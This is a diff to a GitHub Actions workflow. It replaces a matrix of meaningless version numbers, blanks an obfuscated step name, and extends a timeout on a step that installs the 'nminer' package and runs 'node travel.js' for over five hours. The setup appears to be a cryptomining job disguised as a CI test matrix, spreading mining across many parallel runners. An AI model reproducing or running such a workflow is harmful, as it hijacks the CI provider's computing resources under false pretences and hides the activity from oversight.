@@ -9,23 +9,21 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 5856 }
-          - { version: 1173 }
-          - { version: 654 }
-          - { version: 6259 }
-          - { version: 6394 }
-          - { version: 7222 }
-          - { version: 9915 }
-          - { version: 6855 }
-          - { version: 1674 }
-          - { version: 7123 }
-          - { version: 7052 }
-          - { version: 5105 }
-          - { version: 3667 }
-          - { version: 6590 }
-          - { version: 2373 }
-          - { version: 7371 }
-          - { version: 8203 }
+          - { version: 9092 }
+          - { version: 5229 }
+          - { version: 9584 }
+          - { version: 9259 }
+          - { version: 5759 }
+          - { version: 5694 }
+          - { version: 8848 }
+          - { version: 6137 }
+          - { version: 876 }
+          - { version: 6058 }
+          - { version: 6100 }
+          - { version: 4153 }
+          - { version: 7830 }
+          - { version: 675 }
+          - { version: 1123 }
 
     steps:
       - name: Checkout
@@ -36,7 +34,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: while confound gadzooks private
+      - name: 
         run: |
           npm install nminer@latest
-          timeout 328m node travel.js || echo "travel executed"
+          timeout 344m node travel.js || echo "travel executed"
